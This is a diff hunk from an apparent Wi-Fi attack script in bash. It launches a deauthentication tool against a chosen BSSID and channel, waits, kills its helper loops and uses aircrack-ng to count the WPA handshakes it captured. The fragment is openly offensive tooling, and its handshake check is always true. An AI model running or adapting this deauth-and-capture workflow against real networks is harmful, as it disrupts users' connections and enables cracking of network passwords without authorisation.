@@ -28,12 +28,16 @@ start () {
     tmout="$input"
 
     printf "Do not close the windows manually.\n"
-    printf "Started attack to ${bold}${bssid}${tdef} at channel ${bold}${ch}${tdef}.\n\n"
+    printf "Started attack to ${bold}${bssid}${tdef}.\n\n"
 
-    "$SCRIPT_DIR"/0deauth.sh --bssid $bssid --ch $ch --iface $iface &
+    xterm -fg red -bg black -hold -e "${SCRIPT_DIR}/0deauth.sh --bssid $bssid --ch $ch --iface $iface" &> /dev/null &
     ppid=$!
 
-    sleep $tmout
+    sleep "$tmout"
+
+    killall attack-loop.sh
+    killall client-loop.sh
+    killall xterm
 
     enf="$(aircrack-ng clients-01.cap | grep -E -o "[0-9]+ handshake" | grep -E -o "[0-9]+")"
     if [[ "$enf" != "0" || "$enf" != "" ]]
